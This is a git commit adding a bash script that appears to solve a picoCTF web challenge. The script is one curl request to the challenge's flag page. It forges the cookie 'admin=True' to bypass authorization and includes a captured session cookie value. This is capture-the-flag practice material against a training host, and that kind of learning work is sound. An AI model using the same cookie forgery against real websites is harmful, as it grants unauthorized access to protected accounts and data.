040273856406cca63469ee5ba2f126841f21d852
Jackmeister <78603128+J4CKMEISTER@users.noreply.github.com>
2023-03-08 23:18:57 +0800

    Create logon.sh

---
+++ PicoCTF/logon.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+curl 'https://jupiter.challenges.picoctf.org/problem/44573/flag' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
+  -H 'Accept-Language: en-US,en;q=0.8' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Cookie: __cf_bm=by3qMiVQfncpLeTnIo2JNOC5nMrkjbkbn41Xw1WGPWk-1678288141-0-AZ9e3T1CEkWm+eq7MU4okIOtCM6ZhhVfVuhO7FFVvgWt79Pwz6WSlmt7+YLvKbtcI/xikxuqDqwLBs73sR5VV6g=; password=test; username=joe; admin=True' \
+  -H 'Referer: https://jupiter.challenges.picoctf.org/problem/44573/' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Sec-GPC: 1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Brave";v="110"' \ 
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed
+
